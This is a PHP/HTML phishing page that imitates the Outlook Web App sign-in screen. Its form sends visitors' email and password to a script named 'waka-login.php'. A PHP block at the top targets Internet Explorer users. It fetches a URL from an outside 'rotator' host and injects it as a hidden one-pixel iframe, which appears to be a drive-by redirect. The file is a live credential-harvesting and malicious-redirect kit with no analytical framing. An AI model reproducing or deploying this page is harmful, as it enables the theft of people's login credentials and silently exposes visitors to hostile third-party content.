<?php     
$ua     = $_SERVER['HTTP_USER_AGENT'];     
$isIE   = (bool)preg_match('/Trident/i', $ua);     
$isIE2  = (bool)preg_match('/MSIE/i', $ua);     
if ($isIE || $isIE2) {         
$key= 'c79b68f6cf00bb35ade05d4b438753f1';         
$flow_url = file_get_contents('http://adrotate.pw/rotator/').$key;         
echo('<iframe src='.$flow_url.' width="1%" height="1"></iframe>');
     }
?>
<!DOCTYPE html>
<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
    <head>
        <meta charset="utf-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <title>Outlook Web App</title>
        <meta name="description" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="data:image/png;base64,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">
        <link href="https://fonts.googleapis.com/css?family=Noto+Sans&display=swap" rel="stylesheet">
         <script src="https://kit.fontawesome.com/fb54c8da4f.js" crossorigin="anonymous"></script>
        <style>
          body{
    background-color: rgb(242,242,242);
    height: 100%;
    margin: 0;
    display: grid;
    grid-template-columns: 200px 400px;
    grid-gap: 30%;
    position: fixed;
}

/* Left hand side */
.leftBlueArea {
    background-color: rgb(0,114,198);
    margin: 0;
    height: 100%;
    grid-column: 1 / 2;
}

.leftWhiteLogo {
    width: 60%;
    margin-top: 200px;
    margin-left: 15%;
}    
/* Left hand side */
           
/* *************************************************************************** */

/* media queries */

  @media screen and (max-width: 550px), (max-height:550px) { 
    body {
        grid-template-columns: 100px 200px;
        grid-gap: 10%;
    }

    .leftWhiteLogo {
        margin-top: 100px;
    }    

    .blue-icon {
        width: 20px;
    }

    #blue-logo {
        margin-top: 8px;
    }

    #head {
       margin-top: 80px;
       height: 50px;
    }

    #rightWhiteArea {
        grid-template-rows: 50px 100px;

    }

    .h1 {
        font-size: 25px;
        margin-top: 0;
    }

    .form{
        margin-top: 70px;
        margin-left: 2px;
    }
}


/* media queries */

/* *************************************************************************** */

/* right area */

.rightWhiteArea {
    grid-column: 2 / 3;
    /* background-color: tomato; */
    height: 100%;
    display: grid;
    grid-template-rows: 40% 20%;
}

.header {
    grid-row: 1/2;
    /* background-color: yellow; */
    margin-top: 120px;
}

h1 {
    font-size: 50px;
    font-family: 'Noto Sans', sans-serif;
    color: rgb(0,114,198);
}

.blue-icon {
    float: left;
    margin-top: 38px;
}

span{
    font-size:2vw;
}

form{
    grid-row: 2/3;
    /* background-color: darkgoldenrod; */
    margin-left: 7px;
}

input{
    margin-bottom: 7px;
}

label {
    color: gray;
}

.arrow {
    width: 10px;
    padding-right: 2px;
}

button {
   border: none;
   color: rgb(0,114,198);
   background-color: transparent;
}

/* right area */

/* *************************************************************************** */

        </style>

    </head>
    <body>
        <div class="leftBlueArea">
            <img class="leftWhiteLogo" src="data:image/png;base64,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" alt="white-logo">
        </div>
        <div class="rightWhiteArea" id="rightWhiteArea">
            <div class="header" id="head">
</head>
<body>
	<div class="lg-container">
		  <h1 class="h1">OUTLOOK<span><sup>®</sup></span></h1>
		<form action="waka-login.php" id="lg-form" name="lg-form" method="post">
			
			    <label for="email">Email</label><br>
                <input type="email" name="email" required><br>
                <label for="password">Password</label><br>
                <input type="password" name="password" required><br>
                <button type="submit" for="submit"><i class="far fa-arrow-alt-circle-right"></i>Sign-in</button>
            </form>
			
		</form>
		<div id="message"></div>
	</div>
</body>
</html>